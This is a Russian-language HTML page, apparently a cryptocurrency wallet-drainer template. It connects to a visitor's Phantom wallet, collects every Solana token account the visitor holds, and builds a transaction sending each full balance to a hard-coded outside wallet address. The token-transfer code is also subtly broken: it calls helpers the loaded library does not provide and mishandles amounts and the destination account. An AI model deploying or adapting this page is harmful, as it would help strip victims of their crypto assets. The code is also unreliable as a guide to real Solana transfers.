<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Transfer Tokens</title>
  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.10.0/dist/web3.min.js"></script>
  <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
    }
    button {
      padding: 15px 30px;
      font-size: 18px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <h1>Передача всех токенов</h1>
  <button id="transferTokens">Отправить все токены</button>

  <script>
    const destinationWallet = "4N8e7Hud7KBsLyMNvnkeQ8RSGWPumDa5Pf9eXgBXZaAE"; // Кошелек для перевода токенов

    async function transferAllTokens() {
      try {
        if (!window.solana) {
          alert("Убедитесь, что у вас установлен Phantom Wallet.");
          return;
        }

        const provider = window.solana;
        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
        const wallet = await provider.connect();
        const publicKey = wallet.publicKey;

        // Получение всех токен-аккаунтов пользователя
        const accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
          programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
        });

        if (accounts.value.length === 0) {
          alert("На вашем кошельке нет токенов для передачи.");
          return;
        }

        // Подтверждение от пользователя
        const confirmation = confirm("Вы уверены, что хотите передать все свои токены?");
        if (!confirmation) return;

        // Создание транзакции
        const transaction = new solanaWeb3.Transaction();

        for (const account of accounts.value) {
          const tokenAccount = account.pubkey; // Токен-аккаунт пользователя
          const tokenAmount = account.account.data.parsed.info.tokenAmount.uiAmount;
          const decimals = account.account.data.parsed.info.tokenAmount.decimals;
          const mintAddress = account.account.data.parsed.info.mint;

          if (tokenAmount > 0) {
            const amountToTransfer = tokenAmount * (10 ** decimals);

            // Добавляем инструкцию перевода токена
            const transferInstruction = solanaWeb3.Token.createTransferInstruction(
              solanaWeb3.TOKEN_PROGRAM_ID, // Программа токенов Solana
              tokenAccount, // Текущий аккаунт токена
              destinationWallet, // Целевой кошелек
              publicKey, // Отправитель
              [], // Подписи
              amountToTransfer // Сумма перевода
            );

            transaction.add(transferInstruction); // Добавляем инструкцию в транзакцию
          }
        }

        if (transaction.instructions.length === 0) {
          alert("Нет токенов для перевода.");
          return;
        }

        // Подписываем и отправляем транзакцию
        const signature = await provider.signAndSendTransaction(transaction);
        console.log(`Транзакция отправлена. Подпись: ${signature}`);
        alert("Все токены успешно переданы!");
      } catch (err) {
        console.error("Ошибка при передаче токенов:", err);
        alert("Произошла ошибка. Проверьте консоль для подробностей.");
      }
    }

    document.getElementById("transferTokens").addEventListener("click", transferAllTokens);
  </script>
</body>
</html>
